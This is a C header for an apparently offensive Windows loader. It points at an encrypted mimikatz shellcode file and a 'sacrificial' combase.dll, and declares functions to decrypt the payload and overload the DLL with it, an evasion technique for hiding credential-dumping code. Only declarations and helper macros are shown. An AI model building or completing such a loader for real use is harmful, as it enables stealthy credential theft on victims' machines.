#pragma once
#include <stdio.h>
#include "structs.h"


/*------------------------------
  Shellcode file on disk
------------------------------*/
#define LOCAL_FILE "C:\\Users\\lgreenleaf\\Desktop\\mimikatz-enc.bin"


/*------------------------
  Sacrificial DLL
------------------------*/
#define SACRIFICIAL_DLL L"\\??\\C:\\Windows\\System32\\combase.dll"


/*-----------------------
  Debug output
-----------------------*/
#define DEBUG



/*----------------------
  Global variables
----------------------*/
extern NTAPIS NtAPIs;
extern PEHDRS peHdrs;


/*-----------------------------
  Function prototypes
-----------------------------*/
BOOL InitAPIs();

//ParsePE
BOOL InitPE(IN PPEHDRS pPeHdrs, IN CONTENT cnt);

//Map DLL
BOOL MapDLL(OUT HMODULE* hModule, OUT PSIZE_T dllSize);


//Crypt
BOOL Crypt(IN PCONTENT cnt);

//Generic
BOOL GetSC(IN PCONTENT cnt);

//Overload
BOOL OverLoad(PPEHDRS pPeHdrs);


//Execute the entrypoint for EXE or DLL
typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);
typedef BOOL(WINAPI* MAIN)();

/*--------------------------------------
 InitializeObjectAttributes Macro
--------------------------------------*/
#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
	(p)->RootDirectory = r;                           \
	(p)->Attributes = a;                              \
	(p)->ObjectName = n;                              \
	(p)->SecurityDescriptor = s;                      \
	(p)->SecurityQualityOfService = NULL;             \
}
#endif

/*--------------------------
  Custom memcpy function
--------------------------*/
static inline void mymemcpy(char* dst, const char* src, int size) {
    int x;
    if (src == NULL) {
        for (x = 0; x < size; x++) {
            *dst = 0x00;
            dst++;
        }
    }
    else {
        for (x = 0; x < size; x++) {
            *dst = *src;
            dst++;
            src++;
        }
    }
}


/*-----------------------------------------
  Simple marcros
-----------------------------------------*/
#ifdef DEBUG
#define DEBUG_PRINT(...) printf(__VA_ARGS__)
#define WDEBUG_PRINT(...) wprintf(__VA_ARGS__)
#else
#define DEBUG_PRINT(...) do {} while (0)
#define WDEBUG_PRINT(...) do {} while (0)
#endif
